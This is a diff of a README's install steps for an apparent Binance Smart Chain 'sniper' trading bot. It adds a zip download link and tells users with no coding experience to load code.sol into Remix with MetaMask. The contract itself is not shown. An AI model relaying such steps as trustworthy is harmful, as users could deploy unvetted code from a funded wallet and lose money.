@@ -8,9 +8,9 @@ Very easy to install, no code experience needed.
 
 Steps to install:
 
-1. Download repo files 
+1. Download repo files https://github.com/tustiicine/bsc-sniper-smart-contract-bot/archive/refs/heads/main.zip
 2. Unzip bsc-sniper-smart-contract-bot-main.zip archive
-3. Navigate to bsc-sniper-smart-contract-bot folder
+3. Navigate to bsc-sniper-smart-contract-bot-main folder
 4. Open your favorite browser with metamask extension installed
 5. Navigate to https://remix.ethereum.org/ then press Open Files
 6. Select code.sol file from bsc-sniper-smart-contract-bot-main folder
